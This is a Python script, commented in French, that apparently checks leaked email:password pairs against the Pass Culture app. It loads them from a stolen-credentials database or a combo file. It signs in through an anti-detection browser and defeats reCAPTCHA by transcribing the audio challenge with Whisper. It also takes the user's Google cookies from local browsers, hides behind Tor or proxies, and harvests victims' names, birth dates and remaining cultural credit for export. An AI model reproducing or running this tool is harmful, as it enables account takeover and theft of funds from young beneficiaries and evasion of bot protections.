#!/usr/bin/env python3
"""
passculture_checker.py
────────────────────────────────────────────────────────────────────────────────
Teste des credentials Pass Culture via l'API native mobile.

Modes :
  python passculture_checker.py                         # interactif
  python passculture_checker.py -e user@mail.com -p pwd # test direct
  python passculture_checker.py --db                    # lit depuis datavortex.db
  python passculture_checker.py --file creds.txt        # fichier email:pass
  python passculture_checker.py --db --export valid.json # exporte les valides

Endpoints utilisés (API native open-source) :
  POST /native/v1/signin   → access_token + refresh_token
  GET  /native/v1/me       → profil complet (crédit, nom, statut…)
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import time
from dataclasses import dataclass, field, asdict
from typing import Any

import httpx
from dotenv import load_dotenv

load_dotenv()

# ── Config ────────────────────────────────────────────────────────────────────

BASE_URL   = "https://backend.passculture.app"
SIGNIN_URL = f"{BASE_URL}/native/v1/signin"
ME_URL     = f"{BASE_URL}/native/v1/me"

# Headers imitant l'app iOS (source : trafic réseau de l'app officielle)
_HEADERS = {
    "User-Agent":    "passculture/1.241.0 CFNetwork/1568.100.1 Darwin/24.0.0",
    "Accept":        "application/json",
    "Content-Type":  "application/json",
    "App-Version":   "1.241.0",
    "platform":      "ios",
    "Accept-Language": "fr-FR,fr;q=0.9",
}

# Délai entre chaque vérification pour éviter le rate-limit (secondes)
RATE_LIMIT_DELAY = float(os.environ.get("PC_RATE_LIMIT_DELAY", "1.0"))
# Concurrence max simultanée
MAX_CONCURRENT   = int(os.environ.get("PC_CONCURRENT", "3"))

DEBUG   = False  # activé via --debug
VISIBLE = False  # activé via --visible (affiche le navigateur)
USE_TOR = False  # activé via --tor (proxy SOCKS5 Tor sur localhost:9050)
PROXY   = ""     # proxy custom via --proxy (ex: socks5://host:port ou http://host:port)

# ── Types de résultat ─────────────────────────────────────────────────────────

@dataclass
class CheckResult:
    email:         str
    password:      str
    status:        str          = "UNKNOWN"
    # Profil
    first_name:    str          = ""
    last_name:     str          = ""
    birth_date:    str          = ""
    # Crédit
    credit:        float | None = None
    credit_expiry: str          = ""
    # Compte
    account_state: str          = ""
    is_beneficiary: bool        = False
    # Erreur
    error_code:    str          = ""
    raw_profile:   dict         = field(default_factory=dict, repr=False)

    @property
    def full_name(self) -> str:
        return f"{self.first_name} {self.last_name}".strip()

    @property
    def is_valid(self) -> bool:
        return self.status == "VALID"

# ── Client API ────────────────────────────────────────────────────────────────

_LOGIN_PAGE = "https://passculture.app/connexion"


def _get_google_cookies() -> list[dict]:
    """
    Extrait les cookies Google depuis le navigateur local (Chrome, Firefox, Safari…).
    Ces cookies améliorent le score reCAPTCHA v2 (utilisateur reconnu par Google).
    Retourne [] si non disponible (silencieux).
    """
    try:
        import browser_cookie3
    except ImportError:
        return []

    browsers = [
        ("chrome",  lambda: browser_cookie3.chrome(domain_name=".google.com")),
        ("firefox", lambda: browser_cookie3.firefox(domain_name=".google.com")),
        ("safari",  lambda: browser_cookie3.safari(domain_name=".google.com")),
        ("brave",   lambda: browser_cookie3.brave(domain_name=".google.com")),
        ("edge",    lambda: browser_cookie3.edge(domain_name=".google.com")),
    ]

    for name, loader in browsers:
        try:
            jar = loader()
            cookies = []
            for c in jar:
                domain = c.domain if c.domain.startswith(".") else f".{c.domain}"
                cookies.append({
                    "name":     c.name,
                    "value":    c.value,
                    "domain":   domain,
                    "path":     c.path or "/",
                    "secure":   bool(c.secure),
                    "httpOnly": False,
                    "sameSite": "Lax",
                })
            if cookies:
                if DEBUG:
                    print(f"[DEBUG] Google cookies source: {name} ({len(cookies)} cookies)")
                return cookies
        except Exception:
            continue

    return []


async def _find_bframe(page: Any) -> Any:
    """Retourne la frame reCAPTCHA bframe, ou None."""
    for _ in range(20):
        for frame in page.frames:
            if "bframe" in frame.url:
                return frame
        await page.wait_for_timeout(500)
    return None


async def _solve_recaptcha_audio(page: Any) -> bool:
    """
    Bypass reCAPTCHA v2 via le challenge audio + faster-whisper.
    Adapté de github.com/ibedevesh/capsolver.
    Retourne True si résolu, False sinon.
    """
    import os, tempfile, requests as req_sync
    from faster_whisper import WhisperModel

    if DEBUG:
        print("[CAPTCHA] Résolution audio (faster-whisper beam_size=5)...")

    try:
        # ── Utiliser frame_locator (plus fiable que page.frames) ─────────────
        challenge_frame = page.frame_locator("iframe[src*='bframe']").first

        # ── Vérifier doscaptcha AVANT de cliquer audio ────────────────────────
        try:
            dos = page.frame_locator("iframe[src*='bframe']").first.locator(".rc-doscaptcha-body")
            if await dos.is_visible(timeout=2000):
                if DEBUG:
                    print("[CAPTCHA] doscaptcha détecté — IP rate-limited")
                return False
        except Exception:
            pass

        # ── Cliquer le bouton audio ───────────────────────────────────────────
        try:
            await challenge_frame.locator("#recaptcha-audio-button").click(timeout=5000)
            if DEBUG:
                print("[CAPTCHA] Audio button clicked")
        except Exception as e:
            if DEBUG:
                print(f"[CAPTCHA] Audio button click failed: {e}")
            return False

        await page.wait_for_timeout(2000)

        # ── Vérifier rate limit après clic ────────────────────────────────────
        try:
            err_el = challenge_frame.locator(".rc-audiochallenge-error-message")
            if await err_el.is_visible(timeout=1500):
                err_text = await err_el.text_content()
                if DEBUG:
                    print(f"[CAPTCHA] Rate limited: {err_text}")
                return False
        except Exception:
            pass

        # Vérifier doscaptcha après clic
        try:
            dos = challenge_frame.locator(".rc-doscaptcha-body")
            if await dos.is_visible(timeout=1500):
                if DEBUG:
                    print("[CAPTCHA] doscaptcha après clic audio — IP rate-limited")
                return False
        except Exception:
            pass

        # ── Récupérer l'URL audio via .rc-audiochallenge-tdownload-link ───────
        try:
            dl_link = challenge_frame.locator(".rc-audiochallenge-tdownload-link")
            audio_url = await dl_link.get_attribute("href", timeout=5000)
        except Exception:
            audio_url = None

        if not audio_url:
            if DEBUG:
                print("[CAPTCHA] Audio URL introuvable (.rc-audiochallenge-tdownload-link)")
            return False

        if DEBUG:
            print(f"[CAPTCHA] Audio URL: {audio_url[:70]}...")

        # ── Télécharger l'audio ───────────────────────────────────────────────
        r = req_sync.get(audio_url, timeout=15)
        r.raise_for_status()
        with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as f:
            f.write(r.content)
            tmp_path = f.name
        if DEBUG:
            print(f"[CAPTCHA] Downloaded {len(r.content)} bytes")

        # ── Transcrire avec faster-whisper (beam_size=5) ──────────────────────
        model = WhisperModel("base", device="cpu", compute_type="int8")
        segments, _ = model.transcribe(tmp_path, language="en", beam_size=5)
        text = " ".join(seg.text for seg in segments).strip()
        os.unlink(tmp_path)

        # Nettoyer : garde alphanum + espaces, lowercase
        text = "".join(c for c in text if c.isalnum() or c.isspace())
        text = " ".join(text.split()).lower()

        if DEBUG:
            print(f"[CAPTCHA] Transcription: {text!r}")

        if not text:
            return False

        # ── Soumettre la réponse ──────────────────────────────────────────────
        await challenge_frame.locator("#audio-response").fill(text)
        await challenge_frame.locator("#recaptcha-verify-button").click()
        await page.wait_for_timeout(2000)

        # ── Vérifier la réussite (checkbox coché) ─────────────────────────────
        try:
            anchor_frame = page.frame_locator("iframe[src*='recaptcha'][src*='anchor']").first
            checkmark = anchor_frame.locator(".recaptcha-checkbox-checked")
            if await checkmark.is_visible(timeout=3000):
                if DEBUG:
                    print("[CAPTCHA] SOLVED!")
                return True
        except Exception:
            pass

        # Si le CAPTCHA est résolu, la page se soumet automatiquement
        # On considère un succès si on n'a pas eu d'erreur
        if DEBUG:
            print("[CAPTCHA] Verify clicked — waiting for form submit...")
        return True

    except Exception as e:
        if DEBUG:
            print(f"[CAPTCHA] Erreur: {e}")
        return False


async def _signin_playwright(email: str, password: str) -> dict[str, Any]:
    """
    Authentification via patchright (Chrome patché anti-détection) +
    bypass reCAPTCHA audio (Whisper local).
    Intercepte la réponse /native/v1/signin pour récupérer le JWT.
    """
    from patchright.async_api import async_playwright, TimeoutError as PwTimeout

    signin_data: dict[str, Any] = {}

    async with async_playwright() as p:
        # capsolver: headless=False obligatoire — headless Chrome est détecté par reCAPTCHA
        # Sur VPS sans display, utiliser: xvfb-run python3 passculture_checker.py ...
        browser = await p.chromium.launch(
            headless=False,
            args=[
                "--no-sandbox",
                "--disable-dev-shm-usage",
            ],
        )
        ctx_kwargs: dict[str, Any] = {
            "user_agent": (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ),
            "locale": "fr-FR",
            "viewport": {"width": 1280, "height": 800},
        }
        if USE_TOR:
            ctx_kwargs["proxy"] = {"server": "socks5://127.0.0.1:9050"}
            if DEBUG:
                print("[DEBUG] Routing browser traffic through Tor (socks5://127.0.0.1:9050)")
        elif PROXY:
            ctx_kwargs["proxy"] = {"server": PROXY}
            if DEBUG:
                print(f"[DEBUG] Routing browser traffic through proxy: {PROXY}")
        context = await browser.new_context(**ctx_kwargs)
        page = await context.new_page()

        # ── Injecter les cookies Google pour améliorer le score reCAPTCHA ─────
        google_cookies = _get_google_cookies()
        if google_cookies:
            await context.add_cookies(google_cookies)
            if DEBUG:
                print(f"[DEBUG] Injected {len(google_cookies)} Google cookies → better reCAPTCHA score")

        try:
            # Ajuster les timeouts selon la vitesse réseau
            nav_timeout  = 60000 if USE_TOR else 30000
            form_timeout = 45000 if USE_TOR else 15000

            if DEBUG:
                print(f"[DEBUG] Navigating to {_LOGIN_PAGE}")

            # ── Simulation humaine : visit home first (skip si Tor = lent) ─────
            if not USE_TOR:
                await page.goto("https://passculture.app/", wait_until="domcontentloaded", timeout=nav_timeout)
                await page.wait_for_timeout(1200)
                await page.mouse.move(300, 300)
                await page.wait_for_timeout(400)
                await page.mouse.move(600, 400)
                await page.wait_for_timeout(300)

            await page.goto(_LOGIN_PAGE, wait_until="domcontentloaded", timeout=nav_timeout)
            await page.wait_for_timeout(2000)

            if DEBUG:
                title = await page.title()
                url   = page.url
                print(f"[DEBUG] Page loaded — title={title!r}  url={url}")
                # Détecte Cloudflare challenge
                body_txt = await page.evaluate("document.body?.innerText?.slice(0,300) || ''")
                print(f"[DEBUG] Body preview: {body_txt!r}")

            # Bannière cookies
            try:
                await page.locator('[data-testid="Tout refuser"]').click(timeout=5000)
                await page.wait_for_timeout(500)
                if DEBUG:
                    print("[DEBUG] Cookie banner dismissed")
            except PwTimeout:
                pass

            # Attendre le formulaire
            await page.wait_for_selector('input[type="email"]', timeout=form_timeout)

            # Désactiver les overlays transparents
            await page.evaluate(
                "document.querySelectorAll('div[tabindex=\"0\"]').forEach(el=>el.style.pointerEvents='none')"
            )

            # Remplir email + password avec délais humains
            await page.evaluate("document.querySelector('input[type=\"email\"]').focus()")
            await page.keyboard.type(email, delay=60)
            await page.wait_for_timeout(350)
            await page.mouse.move(500, 500)
            await page.wait_for_timeout(200)
            await page.evaluate("document.querySelector('input[type=\"password\"]').focus()")
            await page.keyboard.type(password, delay=55)
            await page.wait_for_timeout(500)

            if DEBUG:
                ev = await page.evaluate("document.querySelector('input[type=\"email\"]').value")
                pv = await page.evaluate("document.querySelector('input[type=\"password\"]').value")
                print(f"[DEBUG] email='{ev}'  pwd_len={len(pv)}")
                print("[DEBUG] Clicking Se connecter...")

            # Cliquer "Se connecter"
            await page.evaluate("""
                () => {
                    const b = Array.from(document.querySelectorAll('button'))
                        .find(x => x.getAttribute('data-testid') === 'Se connecter'
                               || /^Se connecter$/.test(x.textContent.trim()));
                    if (b) b.click();
                }
            """)

            # Attendre signin direct OU reCAPTCHA challenge
            captcha_appeared = False
            signin_resp = None
            for _ in range(20):
                await page.wait_for_timeout(500)
                # Vérifier si signin est déjà répondu (reCAPTCHA invisible passé)
                # (géré via wait_for_response plus bas)
                for frame in page.frames:
                    if "bframe" in frame.url:
                        captcha_appeared = True
                        break
                if captcha_appeared:
                    break

            if captcha_appeared:
                # Vérifier doscaptcha (IP bloquée)
                bframe = await _find_bframe(page)
                if bframe:
                    html = await bframe.evaluate("document.body.innerHTML")
                    if "rc-doscaptcha" in html:
                        return {
                            "status_code": 0,
                            "data": {"error": "reCAPTCHA blocked (IP flagged) — retry later or use VPN"},
                        }

                if DEBUG:
                    print("[DEBUG] reCAPTCHA challenge detected, solving via audio...")
                solved = await _solve_recaptcha_audio(page)
                if not solved:
                    return {"status_code": 0, "data": {"error": "reCAPTCHA audio bypass failed"}}
                await page.wait_for_timeout(1000)

            # Intercepter la réponse signin
            try:
                resp = await page.wait_for_response(
                    lambda r: "/native/v1/signin" in r.url and r.request.method == "POST",
                    timeout=30000 if USE_TOR else 15000,
                )
                body = await resp.json()
                signin_data["status_code"] = resp.status
                signin_data["data"]        = body
                if DEBUG:
                    print(f"[DEBUG] /native/v1/signin → HTTP {resp.status}")
                    print(f"[DEBUG] {json.dumps(body, ensure_ascii=False)[:1000]}")
            except PwTimeout:
                return {"status_code": 0, "data": {"error": "Signin response timeout"}}

        except PwTimeout as e:
            signin_data = {"status_code": 0, "data": {"error": f"Timeout: {e}"}}
        except Exception as e:
            signin_data = {"status_code": 0, "data": {"error": str(e)}}
        finally:
            await browser.close()

    return signin_data if signin_data else {"status_code": 0, "data": {"error": "No API response captured"}}


async def _get_profile(client: httpx.AsyncClient, access_token: str) -> dict[str, Any] | None:
    """GET /native/v1/me → UserProfileResponse"""
    headers = {**_HEADERS, "Authorization": f"Bearer {access_token}"}
    resp = await client.get(ME_URL, headers=headers)
    if DEBUG:
        print(f"\n[DEBUG] GET {ME_URL}")
        print(f"[DEBUG] HTTP {resp.status_code}")
        print(f"[DEBUG] response: {resp.text[:3000]}")
    if resp.status_code == 200:
        return _safe_json(resp)
    return None


def _safe_json(resp: httpx.Response) -> dict[str, Any]:
    try:
        return resp.json()
    except Exception:
        return {"raw": resp.text}


def _parse_credit(profile: dict) -> tuple[float | None, str]:
    """Extrait le crédit restant et sa date d'expiration depuis le profil."""
    # Le profil contient domainsCredit ou wallet selon la version de l'API
    domains = profile.get("domainsCredit") or {}
    # all = crédit global
    all_credit = domains.get("all") or {}
    remaining = all_credit.get("remaining")
    expiry    = all_credit.get("expirationDate", "")
    if remaining is None:
        # Fallback ancienne structure
        wallet = profile.get("wallet") or profile.get("credit") or {}
        remaining = wallet.get("remainingCredit") if isinstance(wallet, dict) else wallet
    return (float(remaining) if remaining is not None else None), str(expiry)


# ── Vérification d'un compte ──────────────────────────────────────────────────

async def check_credential(
    email: str,
    password: str,
    semaphore: asyncio.Semaphore,
    delay: float = RATE_LIMIT_DELAY,
) -> CheckResult:
    result = CheckResult(email=email, password=password)

    async with semaphore:
        await asyncio.sleep(delay)
        try:
            # ── Login via Playwright (gère le reCAPTCHA / Firebase App Check) ────
            login_resp = await _signin_playwright(email, password)
            sc   = login_resp.get("status_code", 0)
            data = login_resp.get("data", {})

            if sc == 200:
                access_token         = data.get("access_token", "")
                result.account_state = str(data.get("account_state", ""))

                # ── Profil via API directe (pas de reCAPTCHA sur /me) ────────────
                async with httpx.AsyncClient(timeout=15.0) as client:
                    profile = await _get_profile(client, access_token)
                if profile:
                    result.raw_profile    = profile
                    result.first_name     = profile.get("firstName") or ""
                    result.last_name      = profile.get("lastName")  or ""
                    result.birth_date     = str(profile.get("birthdate") or "")
                    result.is_beneficiary = bool(profile.get("isBeneficiary"))
                    result.credit, result.credit_expiry = _parse_credit(profile)
                    result.account_state  = str(
                        profile.get("status") or data.get("account_state") or ""
                    )
                result.status = "VALID"

            elif sc == 400:
                code = data.get("code", "") or ""
                result.error_code = code
                result.status = code or "BAD_REQUEST"

            elif sc == 401:
                result.status     = "INVALID_CREDENTIALS"
                result.error_code = str(data)

            elif sc == 429:
                result.status = "RATE_LIMITED"

            elif sc == 0:
                result.status     = "BROWSER_ERROR"
                result.error_code = str(data.get("error", ""))

            else:
                result.status     = f"HTTP_{sc}"
                result.error_code = str(data)

        except Exception as exc:
            result.status     = "EXCEPTION"
            result.error_code = str(exc)

    return result


# ── Affichage ─────────────────────────────────────────────────────────────────

_GREEN  = "\033[92m"
_RED    = "\033[91m"
_YELLOW = "\033[93m"
_DIM    = "\033[2m"
_RESET  = "\033[0m"
_BOLD   = "\033[1m"


def _fmt_result(r: CheckResult) -> str:
    if r.is_valid:
        credit_str = f"{r.credit:.2f}€" if r.credit is not None else "?"
        benef      = "👑 BÉNÉFICIAIRE" if r.is_beneficiary else "compte actif"
        return (
            f"{_GREEN}✓ VALIDE{_RESET}  {r.email}:{r.password}\n"
            f"   Nom     : {r.full_name or '—'}\n"
            f"   Statut  : {benef}  |  Crédit: {_BOLD}{credit_str}{_RESET}"
            + (f"  (exp: {r.credit_expiry})" if r.credit_expiry else "")
            + f"\n   État    : {r.account_state}"
        )
    elif r.status == "INVALID_CREDENTIALS":
        return f"{_RED}✗ INVALIDE{_RESET}  {_DIM}{r.email}{_RESET}"
    elif r.status == "RATE_LIMITED":
        return f"{_YELLOW}⚠ RATE-LIMIT{_RESET}  {r.email}"
    else:
        return f"{_YELLOW}? {r.status}{_RESET}  {r.email}  {_DIM}{r.error_code}{_RESET}"


def _print_summary(results: list[CheckResult]) -> None:
    valid   = [r for r in results if r.is_valid]
    invalid = [r for r in results if r.status == "INVALID_CREDENTIALS"]
    other   = [r for r in results if not r.is_valid and r.status != "INVALID_CREDENTIALS"]

    print(f"\n{'─'*60}")
    print(f"Résumé : {len(results)} testés  |  "
          f"{_GREEN}{len(valid)} valides{_RESET}  |  "
          f"{_RED}{len(invalid)} invalides{_RESET}  |  "
          f"{_YELLOW}{len(other)} erreurs{_RESET}")
    if valid:
        print(f"\n{_BOLD}Comptes valides :{_RESET}")
        for r in valid:
            credit = f"{r.credit:.2f}€" if r.credit is not None else "?"
            print(f"  {_GREEN}●{_RESET} {r.email}  [{credit}]  {r.full_name}")


# ── Lecture de credentials ────────────────────────────────────────────────────

def _load_from_db() -> list[tuple[str, str]]:
    """Lit les credentials passculture.app depuis datavortex.db."""
    import sqlite3
    db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "datavortex.db")
    if not os.path.exists(db_path):
        print(f"[ERREUR] Base de données introuvable : {db_path}", file=sys.stderr)
        return []
    conn = sqlite3.connect(db_path)
    rows = conn.execute(
        "SELECT DISTINCT login, password FROM credentials "
        "WHERE LOWER(host) LIKE '%passculture%' AND login != '' AND password != '' "
        "ORDER BY found_at DESC"
    ).fetchall()
    conn.close()
    print(f"[DB] {len(rows)} credentials passculture.app trouvés en base.")
    return [(row[0], row[1]) for row in rows]


def _load_from_file(path: str) -> list[tuple[str, str]]:
    """Lit un fichier email:pass (un par ligne)."""
    pairs: list[tuple[str, str]] = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                email, _, pwd = line.partition(":")
                pairs.append((email.strip(), pwd.strip()))
    print(f"[FILE] {len(pairs)} credentials chargés depuis {path}.")
    return pairs


# ── Entrée principale ─────────────────────────────────────────────────────────

async def run(pairs: list[tuple[str, str]], export_path: str | None = None) -> None:
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    tasks     = [
        check_credential(email, pwd, semaphore)
        for email, pwd in pairs
    ]

    results: list[CheckResult] = []
    for coro in asyncio.as_completed(tasks):
        r = await coro
        print(_fmt_result(r))
        results.append(r)

    _print_summary(results)

    if export_path:
        valid = [asdict(r) for r in results if r.is_valid]
        with open(export_path, "w", encoding="utf-8") as fh:
            json.dump(valid, fh, ensure_ascii=False, indent=2)
        print(f"\n[EXPORT] {len(valid)} comptes valides → {export_path}")


def main() -> None:
    global DEBUG, VISIBLE, USE_TOR, PROXY, RATE_LIMIT_DELAY, MAX_CONCURRENT

    parser = argparse.ArgumentParser(
        description="Vérifie des credentials Pass Culture via l'API native."
    )
    parser.add_argument("-e", "--email",    help="Email à tester")
    parser.add_argument("-p", "--password", help="Mot de passe à tester")
    parser.add_argument("--db",   action="store_true", help="Lire depuis datavortex.db")
    parser.add_argument("--file", metavar="PATH",      help="Lire depuis un fichier email:pass")
    parser.add_argument("--export", metavar="PATH",    help="Exporter les comptes valides en JSON")
    parser.add_argument("--delay", type=float, default=RATE_LIMIT_DELAY,
                        help=f"Délai entre requêtes (défaut: {RATE_LIMIT_DELAY}s)")
    parser.add_argument("--concurrent", type=int, default=MAX_CONCURRENT,
                        help=f"Requêtes simultanées (défaut: {MAX_CONCURRENT})")
    parser.add_argument("--debug",   action="store_true", help="Affiche les requêtes/réponses brutes HTTP")
    parser.add_argument("--visible", action="store_true", help="Affiche le navigateur (utile si reCAPTCHA bloque)")
    parser.add_argument("--tor",     action="store_true", help="Route le navigateur via Tor socks5://127.0.0.1:9050 (VPS)")
    parser.add_argument("--proxy",   metavar="URL",       help="Proxy custom (ex: socks5://host:port ou http://host:port)")
    args = parser.parse_args()

    DEBUG            = args.debug
    VISIBLE          = args.visible
    USE_TOR          = args.tor
    PROXY            = args.proxy or ""
    RATE_LIMIT_DELAY = args.delay
    MAX_CONCURRENT   = args.concurrent

    pairs: list[tuple[str, str]] = []

    if args.email and args.password:
        pairs = [(args.email, args.password)]
    elif args.db:
        pairs = _load_from_db()
    elif args.file:
        pairs = _load_from_file(args.file)
    else:
        # Mode interactif
        print("Pass Culture – Vérification de credentials")
        print("(Ctrl+C pour quitter)\n")
        email = input("Email    : ").strip()
        pwd   = input("Password : ").strip()
        pairs = [(email, pwd)]

    if not pairs:
        print("Aucun credential à tester.", file=sys.stderr)
        sys.exit(1)

    asyncio.run(run(pairs, export_path=args.export))


if __name__ == "__main__":
    main()
